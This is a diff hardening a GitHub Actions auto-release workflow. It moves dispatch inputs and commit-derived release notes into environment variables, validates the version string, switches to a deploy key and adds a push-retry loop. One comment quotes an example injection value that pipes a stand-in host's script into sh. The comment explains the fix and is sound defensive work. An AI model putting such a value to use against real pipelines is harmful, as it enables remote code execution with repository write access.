@@ -18,6 +18,10 @@ on:
 env:
   CARGO_TERM_COLOR: always
 
+concurrency:
+  group: auto-release
+  cancel-in-progress: false
+
 permissions:
   contents: write
 
@@ -45,6 +49,8 @@ jobs:
 
       - name: Analyze commits and determine version bump
         id: analyze
+        env:
+          VERSION_OVERRIDE: ${{ github.event.inputs.version_override }}
         run: |
           set -e
 
@@ -53,9 +59,16 @@ jobs:
           echo "current_version=$CURRENT_VERSION" >> $GITHUB_OUTPUT
           echo "Current version: $CURRENT_VERSION"
 
-          # Check if version override is provided
-          if [ -n "${{ github.event.inputs.version_override }}" ]; then
-            NEW_VERSION="${{ github.event.inputs.version_override }}"
+          # Read through the environment, never interpolated into the
+          # script. A dispatch input is attacker-controlled text: pasted in
+          # directly, `"; curl evil.sh | sh; "` would execute in a job that
+          # holds contents:write and a GITHUB_TOKEN.
+          if [ -n "${VERSION_OVERRIDE:-}" ]; then
+            if ! printf '%s' "$VERSION_OVERRIDE" | grep -Eq '^[0-9]+\.[0-9]+\.[0-9]+$'; then
+              echo "::error::version_override must be MAJOR.MINOR.PATCH"
+              exit 1
+            fi
+            NEW_VERSION="$VERSION_OVERRIDE"
             echo "Version override provided: $NEW_VERSION"
             echo "new_version=$NEW_VERSION" >> $GITHUB_OUTPUT
             echo "bump_type=override" >> $GITHUB_OUTPUT
@@ -179,7 +192,13 @@ jobs:
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
-          token: ${{ secrets.GITHUB_TOKEN }}
+          # A deploy key, not GITHUB_TOKEN. GitHub does not start a workflow
+          # from an event created with GITHUB_TOKEN, so the tag this job
+          # pushes would land with no binaries attached — which is exactly
+          # what happened at v0.7.5 and v0.8.0. A deploy key is an ordinary
+          # authenticated git credential, so its pushes do trigger
+          # release.yml, and unlike a PAT it is scoped to this repository.
+          ssh-key: ${{ secrets.RELEASE_SSH_KEY }}
 
       - name: Configure Git
         run: |
@@ -213,11 +232,24 @@ jobs:
           NEW_VERSION="${{ needs.analyze-commits.outputs.new_version }}"
           TAG_NAME="v$NEW_VERSION"
           
+          # Rebase before pushing: anything landing on main between the
+          # checkout and here would otherwise fail the job with the bump
+          # already committed locally, leaving the tag unpushed.
+          for attempt in 1 2 3; do
+            if git push origin HEAD:main; then
+              break
+            fi
+            echo "push rejected (attempt $attempt); rebasing onto origin/main"
+            git fetch origin main
+            git rebase origin/main
+            [ "$attempt" = 3 ] && { echo "::error::could not push the version bump"; exit 1; }
+          done
+
+          # The tag is created only after the push settles, so it always
+          # points at the commit that actually landed on main. Creating it
+          # first meant a rebase left the tag on an orphaned commit.
           echo "Creating tag $TAG_NAME"
           git tag -a "$TAG_NAME" -m "Release $TAG_NAME"
-          
-          # Push commit and tag
-          git push origin main
           git push origin "$TAG_NAME"
           
           echo "tag_created=true" >> $GITHUB_OUTPUT
@@ -231,6 +263,8 @@ jobs:
 
     steps:
       - name: Print dry run summary
+        env:
+          RELEASE_NOTES: ${{ needs.analyze-commits.outputs.release_notes }}
         run: |
           echo "## 🔍 Dry Run Summary" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
@@ -239,7 +273,9 @@ jobs:
           echo "**Bump Type:** ${{ needs.analyze-commits.outputs.bump_type }}" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
           echo "### Changes to be released:" >> $GITHUB_STEP_SUMMARY
-          echo "${{ needs.analyze-commits.outputs.release_notes }}" >> $GITHUB_STEP_SUMMARY
+          # Via env: these are commit subjects from a public repository, and
+          # a subject containing backticks or $(...) would execute here.
+          printf '%s\n' "$RELEASE_NOTES" >> $GITHUB_STEP_SUMMARY
           echo "" >> $GITHUB_STEP_SUMMARY
           echo "---" >> $GITHUB_STEP_SUMMARY
           echo "*This was a dry run. No changes were made.*" >> $GITHUB_STEP_SUMMARY
